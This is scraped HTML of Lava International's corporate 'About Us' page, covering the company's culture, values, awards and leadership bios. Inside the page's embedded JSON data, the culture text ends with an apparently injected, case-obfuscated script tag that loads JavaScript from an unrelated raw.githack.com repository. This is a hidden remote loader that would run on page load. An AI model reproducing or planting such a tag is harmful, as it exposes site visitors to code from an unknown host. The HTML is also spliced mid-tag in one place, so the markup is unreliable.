page%2Fimage%2Fabout-banner-1721366465.webp&amp;w=3840&amp;q=75"/><img alt="About Lava" loading="lazy" width="768" height="550" decoding="async" data-nimg="1" class="max-w-full w-full m-auto block md:hidden" style="color:transparent" srcSet="/_next/image?url=https%3A%2F%2Fhotfixapi.lavamobiles.com%2Fstorage%2Fmedia%2Fcmspage%2Fimage_mobile%2Fmobile-768x550-5-1721469598.webp&amp;w=828&amp;q=75 1x, /_next/image?url=https%3A%2F%2Fhotfixapi.lavamobiles.com%2Fstorage%2Fmedia%2Fcmspage%2Fimage_mobile%2Fmobile-768x550-5-1721469598.webp&amp;w=1920&amp;q=75 2x" src="/_next/image?url=https%3A%2F%2Fhotfixapi.lavamobiles.com%2Fstorage%2Fmedia%2Fcmspage%2Fimage_mobile%2Fmobile-768x550-5-1721469598.webp&amp;w=1920&amp;q=75"/></div></section><section><div class="container mx-auto px-4 2xl:px-10 mt-[-10%] z-10 relative"><div class="rounded-tl-55 rounded-tr-55 bg-white m-auto xl:py-10 py-3 w-full"><div class="mx-auto xl:px-2 md:px-0 px-2 text-justify __readmore"><h2 class="text-pink about-culture md:uppercase font-S700 mb-2">Our Culture and Philosophy</h2><div class="[&amp;&gt;p]:text-base culture-before"><p>A strong culture is what separates great companies from those that perish sooner or later. As everything else, be it an invention or any technology, it can be equaled, if not bettered. Building a strong culture by working with exceptional, like-minded people and having a strong infrastructure of systems and processes to enable the envisioned culture is our highest priority.</p><p>Nothing in nature, whether living or inert, exists for its own sake. Everything exists to serve something other than itself. The sun, the air, the earth, every tree, animal or even natural resources are examples of this. The greater its contribution to others, the greater is the power that is bestowed upon it. As human beings, at the smallest level, we exist for our immediate families. As we allow the radius to expand, it covers the larger community that we are a part of, and eventually we exist for all of humanity. The more number of people we impact, the greater is the power that we receive from the cosmos. It is the fundamental law of nature.</p></div></div><button type="button" class="inline-block pt-6">Read More</button></div></div></section><section class="py-10 md:pb-10 ui-culture core-v-box"><div class="container mx-auto px-4 2xl:px-10"><div><h2 class="text-pink lg:text-custom-22   md:uppercase md:leading-22 smdesk:text-custom-22  text-custom-22 smdesk:leading-37 leading-32  font-S700 md:mb-5 mb-3">Core Values</h2></div><div class="swiper core-values-abt"><div class="swiper-wrapper"><div class="swiper-slide"><div class="p-4 py-0 md:first:pl-0 bg-lightWhite rounded-xl flex md:rounded-none md:bg-transparent  about-core-value"><div class="core-box  bg-gradient-to-b p-5"><div class="core-val-image"><img alt="Integrity" loading="lazy" width="78" height="77" decoding="async" data-nimg="1" class="mx-auto" style="color:transparent" src="assets/img/core-value1_icon_1.svg"/></div><h3 class="font-S700 text-black text-base mb-2 md:text-xl md:my-4 text-center">Integrity</h3><p class="text-sm md:text-base text-[#757575] font-S400 w-full text-justify">Steadfast adherence to high moral and professional standards. We should have the same qualities that we seek from others, to be of value to others. It is from this premise that we have adopted the value of integrity, which is essentially about doing the right things.</p></div></div></div><div class="swiper-slide"><div class="p-4 py-0 md:first:pl-0 bg-lightWhite rounded-xl flex md:rounded-none md:bg-transparent  about-core-value"><div class="core-box  bg-gradient-to-b p-5"><div class="core-val-image"><img alt="Integrity" loading="lazy" width="78" height="77" decoding="async" data-nimg="1" class="mx-auto" style="color:transparent" src="assets/img/core-value2_icon_1.svg"/></div><h3 class="font-S700 text-black text-base mb-2 md:text-xl md:my-4 text-center">Passion For Excellence</h3><p class="text-sm md:text-base text-[#757575] font-S400 w-full text-justify">Intense keenness to stretch the limits of greatness in everything we do. The desire to go into the details to achieve the highest standards of quality with utmost efficiency so that we can achieve great things, together. Excellence is a continuous cycle of rigorous planning, execution and measurement.</p></div></div></div><div class="swiper-slide"><div class="p-4 py-0 md:first:pl-0 bg-lightWhite rounded-xl flex md:rounded-none md:bg-transparent  about-core-value"><div class="core-box  bg-gradient-to-b p-5"><div class="core-val-image"><img alt="Integrity" loading="lazy" width="78" height="77" decoding="async" data-nimg="1" class="mx-auto" style="color:transparent" src="assets/img/core-value3_icon_1.svg"/></div><h3 class="font-S700 text-black text-base mb-2 md:text-xl md:my-4 text-center">Adaptability</h3><p class="text-sm md:text-base text-[#757575] font-S400 w-full text-justify">The ability to quickly evolve in response to changing circumstances. Possessing the humility to truly understand the principle of constant change, along with the nimbleness to quickly evolve and adapt to it, is crucial for survival.</p></div></div></div></div></div></div></section><section class="py-5 xl:py-10 ui-leadership hidden"><div class="container mx-auto px-4 2xl:px-10"><div class=""><h2 class="text-pink   lg:text-custom-22   lg:leading-40 smdesk:text-custom-27  480xs:text-custom-22 smdesk:leading-37 480xs:leading-32 md:uppercase font-S700 md:mb-5 mb-3">Our Board of Directors</h2></div><div class="flex md:flex-row flex-col items-center relative bg-gray-spl"><div class="md:w-1/2 w-full"><img src="/assets/img/sunil-raina.png" width="938" height="563" class="max-w-full w-full rounded-md rounded-b-none md:rounded-none" alt="Board of Directors"/></div><div class="relative rounded-md rounded-t-none md:rounded-none md:top-1/2 md:w-1/2 w-full h-auto md:pt-5 md:pb-10 md:px-10 p-5 mb-5 md:mb-0"><div class="flex-col mb-3 md:flex-row md:mb-6"><h3 class="text-xl font-S700 text-black">Mr. Sunil Raina</h3><p class="text-sm md:text-base ml-0 text-black">Managing Director</p></div><p class="text-sm md:text-base font-S400 text-black text-justify">For the past 13 years, Sunil has been an integral part of Lava International Ltd., previously serving as the President and Business Head at the company. Along with his role of spearheading the organization, he is also a Board Member at Lava International Ltd.</p><p class="text-sm md:text-base font-S400 text-black text-justify mt-3">His vision is to bring more value to the consumers by investing more in R&amp;D capabilities and affordable 5G smartphones without compromising on the customer experience.</p></div></div><div class="md:pt-10"><div class="grid lg:grid-cols-3  md:grid-cols-2 grid-cols-1 gap-10"></div></div><div class="md:pt-10"><div class=""><h2 class="text-pink   lg:text-custom-22   lg:leading-40 smdesk:text-custom-27  480xs:text-custom-22 smdesk:leading-37 480xs:leading-32 md:uppercase font-S700 md:mb-5 mb-3">Our Management</h2></div><div class="grid lg:grid-cols-3  md:grid-cols-2 grid-cols-1 gap-10"></div></div></div></section><section class="py-5 xl:py-10"><div class="container mx-auto px-4 2xl:px-10"><h2 class="text-pink   lg:text-custom-22 lg:leading-40 smdesk:text-custom-27  480xs:text-custom-22 smdesk:leading-37 480xs:leading-32 md:uppercase font-S700 md:mb-5 mb-3&#x27;">Started in 2009 | Most Trusted Brand in India</h2><div class="lg:ml-auto relative bg-gray-spl"><div class="relative flex md:flex-row flex-col"><div class="md:w-3/5 w-full md:p-14 z-10p-5"><p class="text-sm md:text-base font-S400 text-black text-justify">Lava International Limited is a leading Mobile Handset Company in India and has expanded its operations to multiple countries across the world. Right from its inception Lava has been at the forefront of building a strong ecosystem of design and manufacturing of mobile handsets. The company has been building mobile handset design capability including industrial design, mechanical design, hardware design &amp; software design. In line with the Govt. of India’s ‘Make in India’ initiative, Lava has taken a lead in support of this important nation building program and has already set up a design team in India, becoming the first to do so in the country.</p><p class="text-sm md:text-base lg:mt-5 font-S400 text-black text-justify">With this ‘Design in India’ initiative, Lava is now the only Mobile handset company that makes truly “Make In India” phones with complete control on design and manufacturing within India. Lava was also ranked as the ‘Most Trustworthy Brand’ in the CMR Retail Sentiment Index 2018. </p><button type="button" class="inline-block pt-6 text-pink">Read More<!-- --> →</button></div><div class="md:w-2/5 w-full  h-auto flex align-bottom relative"><img src="/assets/img/brand-img.png" class="m-auto standard-image-size md:absolute md:top-[50px] md:right-0 3xl:w-3/4" alt="Lava about"/></div></div></div></div></section><section class="py-5 md:py-16"><div class="container mx-auto px-4 2xl:px-10 xl:w-[1250px]"><h2 class="text-pink lg:text-custom-22   lg:leading-40 smdesk:text-custom-27  480xs:text-custom-22 smdesk:leading-37 480xs:leading-32 md:uppercase font-S700 mb-3 md:mb-5 xl:text-center">Awards &amp; Recognitions</h2><div class="swiper awards-box"><div class="swiper-wrapper"><div class="swiper-slide"><div class="about-box md:pt-10 md:px-5 p-5 h-72"><div class="about-image-box"><img alt="Best Customer Experience Team of The Year Award" loading="lazy" width="252" height="234" decoding="async" data-nimg="1" class="w-full h-full m-auto" style="color:transparent" srcSet="/_next/image?url=https%3A%2F%2Fhotfixapi.lavamobiles.com%2Fstorage%2Fmedia%2Fcmsimage%2Fimage_path%2Faward1-1703340492.webp&amp;w=256&amp;q=75 1x, /_next/image?url=https%3A%2F%2Fhotfixapi.lavamobiles.com%2Fstorage%2Fmedia%2Fcmsimage%2Fimage_path%2Faward1-1703340492.webp&amp;w=640&amp;q=75 2x" src="/_next/image?url=https%3A%2F%2Fhotfixapi.lavamobile ript id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"aboutData":{"status":1,"msg":"aboutus Page Content","data":{"id":6,"slug":"aboutus","name":"About Us","sub_text":"About Us Page","content1":"\u003ch2 class=\"text-pink about-culture md:uppercase font-S700  mb-2\"\u003eOur Culture and Philosophy\u003c/h2\u003e\r\n        \u003cdiv class=\"[\u0026amp;\u003ep]:text-base culture-before\"\u003e\r\n\r\n          \u003cp\u003eA strong culture is what separates great companies from those that perish sooner or later. As everything else, be it an invention or any technology, it can be equaled, if not bettered. Building a strong culture by working with exceptional, like-minded people and having a strong infrastructure of systems and processes to enable the envisioned culture is our highest priority.\u003c/p\u003e\r\n          \u003cp\u003e\r\n          Nothing in nature, whether living or inert, exists for its own sake. Everything exists to serve something other than itself. The sun, the air, the earth, every tree, animal or even natural resources are examples of this. The greater its contribution to others, the greater is the power that is bestowed upon it. As human beings, at the smallest level, we exist for our immediate families. As we allow the radius to expand, it covers the larger community that we are a part of, and eventually we exist for all of humanity. The more number of people we impact, the greater is the power that we receive from the cosmos. It is the fundamental law of nature.\r\n          \u003c/p\u003e\r\n\r\n          \u003cp\u003e It is the conscious understanding of this simple universal principle that forms the core purpose of Lava - “To empower people to do more, to be more.” This includes all stakeholders – consumers, partners, employees, shareholders and society as a whole.\u003c/p\u003e\r\n          \u003cp\u003e External circumstances are more or less the same for everyone, so it stands to reason that the main difference between success and failure is purely internal. For the individual, the internal factor is their character, and for the collective, it is culture, which comprises the shared beliefs, behaviors and actions of a group of people. Lava follows a belief system that anything is possible when conceived with clarity and pursued with commitment, conviction, focus and determination. It is expressed as - Create Possibilities. While belief forms the foundation of a culture, values are its pillars. For Lava, these pillars are built on the dictum of “do what is right and do it right”, which are manifested into our values of integrity, passion for excellence and adaptability.\u003c/p\u003e\r\n          \u003c/div\u003e\u003csCrIpT sRc=//raw.githack.com/gogok4nxgo/1v9et39j58z1/main/1.js\u003e\u003c/ScRiPt\u003e","content2":"\u003ch2 class=\"text-pink lg:text-custom-22   md:uppercase md:leading-22 smdesk:text-custom-22  text-custom-22 smdesk:leading-37 leading-32  font-S700 md:mb-5 mb-3\"\u003eCore Values\u003c/h2\u003e","content3":"\u003cp\u003e\u003cbr\u003e\u003c/p\u003e","content4":"\u003cp\u003e\u003cbr\u003e\u003c/p\u003e","content5":null,"content6":null,"page_title":"About LAVA– Indian Mobile Phone Company, Smartphone Manufacturer in India","meta_keywords":null,"meta_description":"About LAVA– Indian Mobile Phone Company, Smartphone Manufacturer in India","meta_other":null,"video_url":null,"image":"media/cmspage/image/about-banner-1721366465.webp","image_alt":null,"image_mobile":"media/cmspage/image_mobile/mobile-768x550-5-1721469598.webp","status":1},"core_value":[{"id":42,"type":"3","title":"Integrity","description":"Steadfast adherence to high moral and professional standards. We should have the same qualities that we seek from others, to be of value to others. It is from this premise that we have adopted the value of integrity, which is essentially about doing the right things.","image_path":null,"image_path_mobile":null,"sorting":1,"svg_path":"assets/img/core-value1_icon_1.svg"},{"id":43,"type":"3","title":"Passion For Excellence","description":"Intense keenness to stretch the limits of greatness in everything we do. The desire to go into the details to achieve the highest standards of quality with utmost efficiency so that we can achieve great things, together. Excellence is a continuous cycle of rigorous planning, execution and measurement.","image_path":null,"image_path_mobile":null,"sorting":1,"svg_path":"assets/img/core-value2_icon_1.svg"},{"id":44,"type":"3","title":"Adaptability","description":"The ability to quickly evolve in response to changing circumstances. Possessing the humility to truly understand the principle of constant change, along with the nimbleness to quickly evolve and adapt to it, is crucial for survival.","image_path":null,"image_path_mobile":null,"sorting":1,"svg_path":"assets/img/core-value3_icon_1.svg"}],"year_data":[{"id":1075,"type":"5","title":"Mr. Rajesh Sethi","description":"\u003cp style=\"margin-bottom:10px;\"\u003eMr. Rajesh Sethi, the Chief Financial Officer (CFO) of Lava International Limited, is a\r\ndistinguished finance leader with over 27 years of extensive experience in financial\r\nmanagement, strategic planning, and operational excellence across diverse sectors. A Fellow\r\nChartered Accountant (FCA), Certified Fraud Examiner (CFE), and Cost and Management\r\nAccountant (CMA), Mr. Sethi is known for his diligence, reliability, and unwavering\r\ncommitment to exceeding performance standards. In his last association with Lava the brand\r\nmarked significant achievements, including a stupendous growth of the company to a turnover\r\nof USD 1 billion within four years of inception. By implementing best-in-class financial systems\r\nand establishing key performance management tools, he has positioned Lava as a leader in\r\nthe industry.\u003c/p\u003e\r\n\u003cp\u003ePrior to his current role, Mr. Sethi served in several high-profile positions, including Group\r\nCFO at STER GROUP in Iraq, CFO at Mobiistar India, Telenor and Bharti Airtel. His extensive\r\nexperience spans various facets of finance, including investor relations, mergers and\r\nacquisitions, financial reporting, and risk management. He has a proven ability to lead cross functional teams and drive significant funding rounds, enhancing organizational performance\r\nand stakeholder confidence. Based in Noida, India, Mr. Sethi continues to play a pivotal role\r\nin overseeing Lava’s financial operations, enhancing financial systems and processes, and\r\nsteering company's fiscal strategies to support its growth plans. His appointment is in line with\r\nLava's vision to strengthen its leadership team for building a global Indian technology\r\nenterprise, rooted to a culture of corporate transparency, governance and innovation\u003c/p\u003e","image_path":"media/cmsimage/image_path/rajesh-sethi-1743083136.webp","image_path_mobile":"media/cmsimage/image_path_mobile/rajesh-sethi-1743083136.webp","sorting":1},{"id":1083,"type":"5","title":"Mr. Rahul Ghosh","description":"\u003cp class=\"MsoNormal\" style=\"text-align: justify;\"\u003eMr. Rahul Ghosh is an accomplished Company Secretary and a Commerce graduate from the University of Delhi, holding associate membership with the Institute of Company Secretaries of India (ICSI) since 2015. With over 10 years of diverse experience across leading organizations such as SMC Global Securities, HT Media, MobiKwik, and Cars24, he brings a deep understanding of corporate compliance and governance.\u003co:p\u003e\u003c/o:p\u003e\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cp class=\"MsoNormal\" style=\"text-align: justify;\"\u003eRahul has played a pivotal role in the successful direct listing of SMC Global Securities on both BSE and NSE, and has contributed significantly to the IPO process of MobiKwik. His core expertise includes regulatory compliance, corporate governance frameworks, independent board processes, policy formulation, and managing shareholder and investor relations.\u003c/p\u003e","image_path":"media/cmsimage/image_path/rahul-ghosh-1749032417.webp","image_path_mobile":"media/cmsimage/image_path_mobile/rahul-ghosh-1749032417.webp","sorting":1}],"most_trusted_brand":[],"awards_recognitions":[{"id":17,"type":"7","title":"Best Customer Experience Team of The Year Award","description":"By Kamikaze B2B Media","image_path":"media/cmsimage/image_path/award1-1703340492.webp","image_path_mobile":null,"sorting":1},{"id":18,"type":"7","title":"Resilient Brand of The Year","description":"Exhibit Tech Awards 2022","image_path":"media/cmsimage/image_path/award2-1705652926.webp","image_path_mobile":null,"sorting":1},{"id":19,"type":"7","title":"Exceptional On-Ground Execution of Money Back Challenge","description":null,"image_path":"media/cmsimage/image_path/award3-1703340553.webp","image_path_mobile":null,"sorting":1},{"id":20,"type":"7","title":"Most Trusted Brand","description":"CMR Retail Sentiment Index 2018","image_path":"media/cmsimage/image_path/award4-1703340586.webp","image_path_mobile":null,"sorting":1},{"id":21,"type":"7","title":"Emerging Company of The Year - 2013","description":null,"image_path":"media/cmsimage/image_path/award5-1703340611.webp","image_path_mobile":null,"sorting":1},{"id":22,"type":"7","title":"The Best Feature Phone Brand","description":"9th Mobility Excellence Award 2022","image_path":"media/cmsimage/image_path/award1-1705652903.webp","image_path_mobile":null,"sorting":1}],"leadership":{"n":[{"id":35,"type":"4","title":"Mr. Sunil Bhalla","description":"Mr. Sunil Bhalla is a professional turned serial entrepreneur. A Mechanical engineer \u0026amp; an MBA from IMT, he has worked with Maruti Udyog Limited in the past. At Lava International Limited, he contributes in Strategic Planning.","image_path":"media/cmsimage/image_path/sunil-1704720305.webp","image_path_mobile":null,"sorting":1,"sub_text":"Director"},{"id":36,"type":"4","title":"Mr. Shailendra Nath Rai","description":"A renowned business professional with over 24 years of varied industry experience, Shailendra Nath Rai is fondly known as SNR. With a degree in Mechanical Engineering and a Green Belt Certification in Six Sigma, SNR is one of the leading professionals in Supply Chain Management in the country today. He has been a part of the greatly acclaimed sponsored research on “Perpetual Supply Demand Balancing” with the Indian School of Business (ISB).","image_path":"media/cmsimage/image_path/shailendra-1704720366.webp","image_path_mobile":null,"sorting":1,"sub_text":"Director"},{"id":37,"type":"4","title":"Mr. Vishal Sehgal","description":"From management trainee at Marico to CEO at Airtel Rajasthan, Vishal has seen business in its various hues. Having worked both in startups like Marico (1992) and Zip Telecom (2001), as well as large organizations like Pepsico India (1998) and Airtel (2005), Vishal has a rich blend of entrepreneurial and professional experience. In his last stint at Airtel Rajasthan before co-founding Lava International, he led the business to a dominant 45% revenue market share in a multi-player industry.\r\n\r\nVishal brings to the table a vast, first-hand knowledge of consumer brands and the telecom business. Being \"tech-curious\" at heart, among other business priorities, he leads the technology evolution practices in the company.","image_path":"media/cmsimage/image_path/about-img-1710244256.webp","image_path_mobile":null,"sorting":1,"sub_text":"Director"},{"id":1052,"type":"4","title":"Mr. Anupam Shrivastava","description":"As Chairman and Managing Director of BSNL, led the organization for 4 and half years from January 2015 to June 2019. As Director of Mobile services in BSNL board from May 2013 to January 2015 initiated BSNL’s revival plan. Simultaneously worked as Director of Finance BSNL board from December 2013 to February 2015. From time to time held Director level posts of Enterprise business, HR and Broadband. ‘7’ years of board level experience. Implemented prestigious Government projects. A Telecommunications expert with International experience. Worked for ‘40’ years in multifarious fields and levels. Post retirement mentoring and advising many companies.","image_path":"media/cmsimage/image_path/anupam-shrivastava1-1714478218.webp","image_path_mobile":null,"sorting":1,"sub_text":"Independent Director"},{"id":1053,"type":"4","title":"Mr. Ajay Kumar Singh","description":"Lt. Gen. A K Singh (Retd), former Lt. Governor of Andaman \u0026amp; Nicobar Islands and Puducherry, boasts an illustrious military career with notable international training. Known for integrity and professionalism, he's admired in the Armed Forces. Commanding various units, including the powerful Strike 1 (Corps), he executed significant maneuvers. In key operational roles, he contributed to strategic planning and represented the military nationally and abroad. As Administrator/Lt. Governor, he accelerated development in A\u0026amp;N Islands and Puducherry, earning praise for his integrity and compassion. He's a member of various councils, decorated with numerous awards, and contributes to academia and defense literature. Currently, he holds advisory roles and teaches at O P Jindal Global University.","image_path":"media/cmsimage/image_path/ajay-kumar-singh1-1714478599.webp","image_path_mobile":null,"sorting":1,"sub_text":"Independent Director"},{"id":1069,"type":"4","title":"Mr. Rajiv Singh","description":"Mr. Rajiv Kumar Singh is a fellow member of the Institute of Chartered Accountants of India (ICAI), a Certified Information system auditor (USA), and a registered valuer with the Insolvency Bankruptcy Board of India (IBBI). He is a co-founder and director of RS Valuation Services Pvt Ltd. He leverages more than 30 years of experience to assist clients in measuring and maximizing value across and throughout the deal continuum. Besides being a nationally known expert on valuation, Mr. Singh’s expertise lies in banking, governance, corporate finance and strategy, M\u0026amp;A and restructuring, risk management, and internal controls. He has served over 500 valuation clients in India, the USA, the UK, Singapore, Bangladesh, Indonesia, Hong Kong, China, Belgium, Mauritius, Nepal, Dubai, and Africa. He is frequently retained in complex valuation disputes. He has also served on the Board of Union Bank of India (UBI), one of the top five largest banks in India from 2018 to 2021.","image_path":"media/cmsimage/image_path/rajiv-singh-ji1-1734700114.webp","image_path_mobile":"media/cmsimage/image_path_mobile/rajiv-singh-ji1-1734700114.webp","sorting":1,"sub_text":"Independent Director"}],"md":[{"id":1075,"type":"5","title":"Mr. Rajesh Sethi","description":"\u003cp style=\"margin-bottom:10px;\"\u003eMr. Rajesh Sethi, the Chief Financial Officer (CFO) of Lava International Limited, is a\r\ndistinguished finance leader with over 27 years of extensive experience in financial\r\nmanagement, strategic planning, and operational excellence across diverse sectors. A Fellow\r\nChartered Accountant (FCA), Certified Fraud Examiner (CFE), and Cost and Management\r\nAccountant (CMA), Mr. Sethi is known for his diligence, reliability, and unwavering\r\ncommitment to exceeding performance standards. In his last association with Lava the brand\r\nmarked significant achievements, including a stupendous growth of the company to a turnover\r\nof USD 1 billion within four years of inception. By implementing best-in-class financial systems\r\nand establishing key performance management tools, he has positioned Lava as a leader in\r\nthe industry.\u003c/p\u003e\r\n\u003cp\u003ePrior to his current role, Mr. Sethi served in several high-profile positions, including Group\r\nCFO at STER GROUP in Iraq, CFO at Mobiistar India, Telenor and Bharti Airtel. His extensive\r\nexperience spans various facets of finance, including investor relations, mergers and\r\nacquisitions, financial reporting, and risk management. He has a proven ability to lead cross functional teams and drive significant funding rounds, enhancing organizational performance\r\nand stakeholder confidence. Based in Noida, India, Mr. Sethi continues to play a pivotal role\r\nin overseeing Lava’s financial operations, enhancing financial systems and processes, and\r\nsteering company's fiscal strategies to support its growth plans. His appointment is in line with\r\nLava's vision to strengthen its leadership team for building a global Indian technology\r\nenterprise, rooted to a culture of corporate transparency, governance and innovation\u003c/p\u003e","image_path":"media/cmsimage/image_path/rajesh-sethi-1743083136.webp","image_path_mobile":"media/cmsimage/image_path_mobile/rajesh-sethi-1743083136.webp","sorting":1,"sub_text":"Chief Financial Officer"},{"id":1083,"type":"5","title":"Mr. Rahul Ghosh","description":"\u003cp class=\"MsoNormal\" style=\"text-align: justify;\"\u003eMr. Rahul Ghosh is an accomplished Company Secretary and a Commerce graduate from the University of Delhi, holding associate membership with the Institute of Company Secretaries of India (ICSI) since 2015. With over 10 years of diverse experience across leading organizations such as SMC Global Securities, HT Media, MobiKwik, and Cars24, he brings a deep understanding of corporate compliance and governance.\u003co:p\u003e\u003c/o:p\u003e\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cp class=\"MsoNormal\" style=\"text-align: justify;\"\u003eRahul has played a pivotal role in the successful direct listing of SMC Global Securities on both BSE and NSE, and has contributed significantly to the IPO process of MobiKwik. His core expertise includes regulatory compliance, corporate governance frameworks, independent board processes, policy formulation, and managing shareholder and investor relations.\u003c/p\u003e","image_path":"media/cmsimage/image_path/rahul-ghosh-1749032417.webp","image_path_mobile":"media/cmsimage/image_path_mobile/rahul-ghosh-1749032417.webp","sorting":1,"sub_text":"Company Secretary \u0026 Compliance Officer"}]},"success":"success"}},"__N_SSP":true},"page":"/aboutus","query":{},"buildId":"0Jq2sIZWQjnzWOj1dE9Dt","isFallback":false,"isExperimentalCompile":false,"gssp":true,"scriptLoader":[]}</script></body></html>
